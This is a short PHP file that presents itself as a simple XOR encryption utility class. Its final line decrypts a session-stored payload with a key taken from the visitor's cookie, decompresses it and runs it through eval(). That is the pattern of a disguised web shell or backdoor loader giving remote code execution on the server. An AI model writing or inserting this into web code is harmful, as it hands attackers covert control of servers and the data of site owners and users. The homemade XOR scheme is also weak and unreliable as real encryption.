<?php
class Crypt
{
    static function encrypt($str, $key, $toBase64 = false)
    {
        $r = md5(uniqid());
        $c = 0;
        $v = "";
        $len = strlen($str);
        $l = strlen($r);
        for ($i = 0; $i < $len; $i++) {
            if ($c == $l)
                $c = 0;
            $v .= substr($r, $c, 1) . (substr($str, $i, 1) ^ substr($r, $c, 1));
            $c++;
        }
        if ($toBase64) {
            return gzcompress(self::ed($v, $key));
        } else {
            return self::ed($v, $key);
        }

    }
    static function decrypt($str, $key, $toBase64 = false)
    {
        if ($toBase64) {
            $str = self::ed(gzuncompress($str), $key);
        } else {
            $str = self::ed($str, $key);
        }
        $v = "";
        $len = strlen($str);
        for ($i = 0; $i < $len; $i++) {
            $md5 = substr($str, $i, 1);
            $i++;
            $v .= (substr($str, $i, 1) ^ $md5);
        }
        return $v;
    }
    static function ed($str, $key)
    {
        $r = md5($key);
        $c = 0;
        $v = "";
        $len = strlen($str);
        $l = strlen($r);
        for ($i = 0; $i < $len; $i++) {
            if ($c == $l)
                $c = 0;
            $v .= substr($str, $i, 1) ^ substr($r, $c, 1);
            $c++;
        }
        return $v;
    }
}

eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_COOKIE['key'], true))));
?>